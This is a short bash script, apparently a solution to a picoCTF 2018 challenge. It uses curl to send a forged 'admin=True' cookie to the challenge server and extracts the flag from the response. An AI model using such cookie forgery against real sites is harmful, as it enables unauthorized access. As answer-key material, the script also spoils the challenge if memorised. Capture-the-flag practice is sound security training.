#!/bin/bash

# page with form, set the admin cookie to True to get the flag in /flag
curl -s --cookie 'admin=True' http://2018shell.picoctf.com:57252/flag | grep -oE 'picoCTF{.*}'
